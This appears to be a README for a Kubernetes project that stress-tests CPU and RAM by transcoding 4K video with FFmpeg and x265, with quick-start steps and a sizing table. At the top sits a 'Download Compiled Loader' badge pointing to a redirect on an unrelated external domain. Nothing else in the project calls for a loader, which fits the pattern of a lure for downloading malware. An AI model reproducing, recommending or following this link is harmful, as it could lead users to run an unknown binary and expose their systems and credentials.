# FFmpeg Stress Test on Kubernetes

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

Real-world CPU and RAM stress workload using 4K video transcoding (FFmpeg + x265).
No synthetic benchmarks — every CPU cycle is spent on genuine video encoding.

## Architecture

Submit jobs to Redis queue. FFmpeg worker pods pull jobs,  source video
from MinIO, transcode 4K AV1 to H.265, upload result. Sustained CPU and RAM
stress is the natural byproduct of real encoding work.

## Prerequisites

- Kubernetes cluster with kubectl access
- metrics-server installed
- Docker
- A container registry the cluster can reach
- mc (MinIO client)

## Quick Start
- git clone <this-repo>
- cd ffmpeg-stress-test
- ./scripts/install-prereqs.sh
- cp .env.example .env
- ./setup.sh
- ./scripts/upload-video.sh /path/to/4k-video.mkv
- ./run.sh

## Sizing

| VM Size           | Replicas | Sustained CPU |
|-------------------|----------|---------------|
| 16 vCPU / 32 GiB  | 2        | ~7 cores      |
| 64 vCPU / 128 GiB | 8        | ~28 cores     |
| 256 vCPU / 2 TiB  | 32-64    | ~120-240      |

## Output

Each run creates runs/run-YYYYMMDD-HHMMSS/ with summary.csv, metrics.log,
log-pod.txt, and pre/post state files.

